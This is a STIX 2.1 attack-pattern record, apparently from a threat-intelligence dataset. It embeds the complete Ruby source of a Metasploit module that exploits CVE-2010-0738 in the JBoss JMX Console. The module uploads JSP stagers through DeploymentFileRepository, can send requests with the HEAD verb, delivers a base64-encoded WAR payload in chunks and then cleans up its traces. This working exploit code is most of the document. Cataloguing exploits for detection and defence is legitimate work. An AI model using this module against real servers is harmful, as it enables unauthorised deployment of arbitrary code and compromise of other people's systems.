{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--86b6b90a-ce4d-4dbb-986c-e7c46215073b",
    "created": "2024-08-14T16:24:15.194616Z",
    "modified": "2024-08-14T16:24:15.19462Z",
    "name": "JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment",
    "description": " This module uses the DeploymentFileRepository class in the JBoss Application Server to deploy a JSP file which then deploys an arbitrary WAR file. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/jboss_deploymentfilerepository.rb",
            "external_id": "jboss_deploymentfilerepository.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=574105"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::JBoss\n\n  def initialize\n    super(\n      'Name' => 'JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment',\n      'Description' => %q{\n        This module uses the DeploymentFileRepository class in the JBoss Application Server\n        to deploy a JSP file which then deploys an arbitrary WAR file.\n      },\n      'Author' => [\n        'us3r777 <us3r777[at]n0b0.so>'\n      ],\n      'References' => [\n        [ 'CVE', '2010-0738' ], # using a VERB other than GET/POST\n        [ 'OSVDB', '64171' ],\n        [ 'URL', 'https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now' ],\n        [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ]\n      ],\n      'Actions' => [\n        ['Deploy', { 'Description' => 'Create and deploy app (WAR) to deliver payload' }],\n        ['Undeploy', { 'Description' => 'Remove app (WAR) for cleanup' }]\n      ],\n      'DefaultAction' => 'Deploy',\n      'License' => BSD_LICENSE,\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('APPBASE', [ true, 'Application base name', 'payload']),\n        OptPath.new('WARFILE', [ false, 'The WAR file to deploy'])\n      ]\n    )\n  end\n\n  def deploy_action(app_base, war_data)\n    stager_base = Rex::Text.rand_text_alpha(rand(8..15))\n    stager_jsp_name = Rex::Text.rand_text_alpha(rand(8..15))\n    encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\\n/, '')\n    stager_contents = stager_jsp_with_payload(app_base, encoded_payload)\n\n    if http_verb == 'POST'\n      print_status('Deploying stager for the WAR file...')\n      res = upload_file(stager_base, stager_jsp_name, stager_contents)\n    else\n      print_status('Deploying minimal stager to upload the payload...')\n      head_stager_jsp_name = Rex::Text.rand_text_alpha(rand(8..15))\n      head_stager_contents = head_stager_jsp(stager_base, stager_jsp_name)\n      head_stager_uri = '/' + stager_base + '/' + head_stager_jsp_name + '.jsp'\n      res = upload_file(stager_base, head_stager_jsp_name, head_stager_contents)\n\n      # We split the stager_jsp_code in multipe junks and transfer on the\n      # target with multiple requests\n      current_pos = 0\n      while current_pos < stager_contents.length\n        next_pos = current_pos + 5000 + rand(100)\n        vars_get = { 'arg0' => stager_contents[current_pos, next_pos] }\n        print_status(\"Uploading second stager (#{current_pos}/#{stager_contents.length})\")\n        res = deploy('uri' => head_stager_uri,\n                     'vars_get' => vars_get)\n        current_pos += next_pos\n      end\n    end\n\n    # Using HEAD may trigger a 500 Internal Server Error (at leat on 4.2.3.GA),\n    # but the file still gets written.\n    unless res && (res.code == 200 || res.code == 500)\n      fail_with(Failure::Unknown, 'Failed to deploy')\n    end\n\n    print_status('Calling stager to deploy the payload warfile (might take some time)')\n    stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'\n    stager_res = deploy('uri' => stager_uri,\n                        'method' => 'GET')\n\n    if res && res.code == 200\n      print_good('Payload deployed')\n    else\n      print_error('Failed to deploy final payload')\n    end\n\n    # Cleaning stagers\n    print_status('Undeploying stagers via DeploymentFileRepository.remove()...')\n    print_status('This might take some time, be patient...') if http_verb == 'HEAD'\n    delete_res = []\n    if head_stager_jsp_name\n      delete_res << delete_file(stager_base + '.war', head_stager_jsp_name, '.jsp')\n    end\n    delete_res << delete_file(stager_base + '.war', stager_jsp_name, '.jsp')\n    delete_res << delete_file('./', stager_base + '.war', '')\n    delete_res.each do |res|\n      if !res\n        print_warning('Unable to remove WAR [No Response]')\n      elsif (res.code < 200 || res.code >= 300)\n        print_warning(\"WARNING: Unable to remove WAR [#{res.code} #{res.message}]\")\n      end\n    end\n  end\n\n  # Undeploy the WAR and the stager if needed\n  def undeploy_action(app_base)\n    print_status(\"Undeploying #{app_base} via DeploymentFileRepository.remove()...\")\n    print_status('This might take some time, be patient...') if http_verb == 'HEAD'\n    res = delete_file('./', app_base + '.war', '')\n\n    unless res\n      print_error('Unable to remove WAR (no response)')\n      return\n    end\n\n    if res.code < 200 || res.code >= 300\n      print_error(\"Unable to remove WAR [#{res.code} #{res.message}]\")\n    else\n      print_good('Successfully removed')\n    end\n  end\n\n  def run\n    app_base = datastore['APPBASE']\n\n    case action.name\n    when 'Deploy'\n      unless datastore['WARFILE'] && File.exist?(datastore['WARFILE'])\n        fail_with(Failure::BadConfig, 'Unable to open WARFILE')\n      end\n      war_data = File.read(datastore['WARFILE'], mode: 'rb')\n      deploy_action(app_base, war_data)\n    when 'Undeploy'\n      undeploy_action(app_base)\n    end\n  end\nend\n"
}